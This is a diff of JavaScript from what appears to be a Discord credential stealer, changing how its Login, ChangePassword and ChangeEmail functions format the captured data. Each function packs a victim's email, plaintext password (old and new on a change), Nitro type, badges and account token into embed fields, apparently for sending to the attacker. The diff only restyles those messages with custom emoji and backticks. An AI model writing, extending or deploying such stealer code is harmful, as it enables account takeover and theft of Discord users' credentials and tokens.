@@ -150,9 +150,10 @@ function Login(email, password, token) {
                         {
                             "name": "<a:arrow:765308889859751976> **Account Info**",
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\` ---------------------------------------- <:staff_blue:936543701294010399> **Password:** \`${password}\``,
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                             <:staff_blue:936543701294010399> **Password:** \`${password}\``,
                             "inline": false
                         },
+
                                  {
                                    "name": "<a:arrow:765308889859751976> **Other Info**",
                                                                                                     
@@ -161,6 +162,7 @@ function Login(email, password, token) {
                                                                                                    
                                    "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  },
+
                                  {
                             "name": "**Token**",
                             "value": `\`${token}\``,
@@ -200,19 +202,19 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "fields": [
                         {
                             "name": "**Password Changed**",
-                            "value": `**Email:** ||${json.email}||\n 
+                            "value": `<:PP_director:942527310324719716> **Email:** \`${json.email}\`\n 
                             
-                            **Old Password:** ||${oldpassword}||\n 
+                            <:staff_blue:936543701294010399> **Old Password:** \`${oldpassword}\`\n 
                             
-                            **New Password:** ||${newpassword}||`,
+                            <:staff_blue:936543701294010399> **New Password:** \`${newpassword}\``,
                             "inline": true
                         },
 
                         {
-                            "name": "**Other Info**",
-                            "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
                             
-                            Badges: ${GetBadges(json.flags)}`,
+                            <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                             "inline": true
                         },
 
@@ -255,17 +257,17 @@ function ChangeEmail(newemail, password, token) {
                     "fields": [
                         {
                             "name": "**Email Changed**",
-                            "value": `**New Email:** ${newemail}\n 
+                            "value": `<:PP_director:942527310324719716> **New Email:** \`${newemail}\`\n 
                             
-                            **Password:** ${password}`,
+                            <:staff_blue:936543701294010399> **Password:** \`${password}\``,
                             "inline": true
                         },
 
                         {
-                            "name": "**Other Info**",
-                            "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
                             
-                            Badges: ${GetBadges(json.flags)}`,
+                            <a:allbadges:895906088996720690> **Badges:** ${GetBadges(json.flags)}`,
                             "inline": true
                         },
 
